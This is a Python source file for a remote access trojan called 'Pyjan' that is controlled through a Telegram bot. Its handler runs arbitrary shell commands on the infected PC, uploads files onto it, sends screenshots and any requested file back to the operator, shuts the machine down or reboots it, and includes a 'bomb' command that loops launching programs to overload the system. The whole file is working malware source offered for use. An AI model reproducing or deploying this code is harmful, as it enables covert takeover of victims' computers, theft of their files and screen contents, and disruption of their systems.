import os
import sys
import time
import shutil
import getpass
import telepot
import socket
import requests
import threading
import subprocess
import encodings.idna
from PIL import ImageGrab
from telepot.loop import MessageLoop

class Pyjan:
    def __init__(self):

        MessageLoop(bot, self.bot_handler).run_as_thread()

        print("[*] Bot connected.\n Enter /help to view functions.")
        for user in trusted_users:
            bot.sendMessage(user, "[*] Bot connected.\n Enter /help to view functions.")

        while True:
            time.sleep(10)



    def bot_handler(self, message):
            print(message)

            userid = message["from"]["id"]


            if userid in trusted_users:
                try:
                    args = message["text"].split()
                except KeyError:
                    args = [""]

                    if "document" in message:
                        file_name = message["document"]["file_name"]
                        file_id = message["document"]["file_id"]
                    elif "photo" in message:
                        file_id = message["photo"][-1]["file_id"]
                        print(message["photo"])
                        file_name = "{}.jpg".format(file_id)

                    file_path = bot.getFile(file_id)['file_path']
                    link = "https://api.telegram.org/file/bot{}/{}".format(token, file_path)
                    File = requests.get(link, stream=True).raw
                    print(link)

                    save_path = os.path.join(os.getcwd(), file_name)
                    with open(save_path, "wb") as out_file:
                        shutil.copyfileobj(File, out_file)

                    bot.sendMessage(message["chat"]["id"], "[*] file uploaded")

                if args[0] == "/help":
                    s = """-----------------------------------------------------------------\n                      System Commands:                        
/cmd - to execute cmd command that requires the return of results 
/run - run the program that doesn't require the return of results
/pwd - current directory
/ls - show files in the directory
/cd - change a directory
/screen - make a screenshot
/download - download a file from computer\n-----------------------------------------------------------------\n                         Funny Function:\n/youtube - prank\n/bomb - fork bomb\n-----------------------------------------------------------------\n                                Power:\n/shutdown - shutdown the PC\n/reboot - restart the PC
/sleep - sleeping/hibernation mode"""
                    bot.sendMessage(message["chat"]["id"], str(s))

                elif args[0] == "/cmd":
                    try:
                        s = "[*] {}".format(subprocess.check_output(' '.join(args[1:]), shell=True))
                    except Exception as e:
                        s = "[!] {}".format(e)

                elif args[0] == "/shutdown":
                    try:
                        s = "[*] Shutdown succeeded"
                        subprocess.call(["shutdown", "-s", "-t", "0"])
                    except Exception as e:
                        s = "[!] {}".format(e)
                    bot.sendMessage(message["chat"]["id"], "{}".format(str(s)))

                elif args[0] == "/sleep":
                    try:
                        s = "[*] Process successful"
                        subprocess.call(["Rundll32.exe", "powrprof.dll,SetSuspendState", "Sleep"])
                    except Exception as e:
                        s = "[!] {}".format(e)
                    bot.sendMessage(message["chat"]["id"], "{}".format(str(s)))

                elif args[0] == "/reboot":
                    try:
                        s = "[*] Process successful"
                        subprocess.call(["shutdown", "-r", "-t", "0"])
                    except Exception as e:
                        s = "[!] {}".format(e)
                    bot.sendMessage(message["chat"]["id"], "{}".format(str(s)))

                elif args[0] == "/youtube":
                    try:
                        s = "[*] This is prank bro!"
                        os.system("start \"\" https://youtube.com/watch?v=dQw4w9WgXcQ")
                    except Exception as e:
                        s = "[!] {}".format(e)
                    bot.sendMessage(message["chat"]["id"], "{}".format(str(s)))

                elif args[0] == "/bomb":
                    try:
                        s = "[*] Booom!!!"
                        while True:
                            os.system("start calc & start explorer.exe & start iexplore.exe")
                    except Exception as e:
                        s = "[!] {}".format(e)
                    bot.sendMessage(message["chat"]["id"], "{}".format(str(s)))



                elif args[0] == "/run":
                    try:
                        s = "[*] Program started"
                        subprocess.Popen(args[1:], shell=True)

                    except Exception as e:
                        s = "[!] {}".format(str(e))
                    bot.sendMessage(message["chat"]["id"], "{}".format(str(s)))

                elif args[0] == "/pwd":
                    try:
                        s = os.path.abspath(os.getcwd())
                    except Exception as e:
                        s = e

                    bot.sendMessage(message["chat"]["id"], "[*] {}".format(str(s)))
                elif args[0] == "/ls":
                    if len(args) == 1:
                        pth = "."
                    else:
                        pth = args[1]
                    s = '\n'.join(os.listdir(path=pth))
                    bot.sendMessage(message["chat"]["id"], "[*] {}".format(str(s)))

                elif args[0] == "/cd":
                    path = os.path.abspath(args[1])
                    os.chdir(path)
                    bot.sendMessage(message["chat"]["id"], "[*] changing directory to {} ...".format(str(path)))

                elif args[0] == "/screen":
                    image = ImageGrab.grab()
                    image.save("pic.jpg")
                    bot.sendDocument(message["chat"]["id"], open("pic.jpg", "rb"))
                    os.remove("pic.jpg")

                elif args[0] == "/download":
                    File = ' '.join(map(str, args[1:]))
                    try:
                        bot.sendDocument(message["chat"]["id"], open(File, "rb"))
                    except Exception:
                        bot.sendMessage(message["chat"]["id"], "[!] you must select the file")
                elif args[0] == "":
                    pass

                else:
                    bot.sendMessage(message["chat"]["id"], "[*] /help to view functions")

            else:
                bot.sendMessage(message["chat"]["id"], "Go away!")

handle = open("api.txt", "r")
data = handle.read()

token = data

handle2 = open("id.txt", "r")
data2 = handle2.read()

data2 = int(str(data2))

trusted_users = [data2]
bot = telepot.Bot(token)
name = id(int)
trojan = Pyjan()

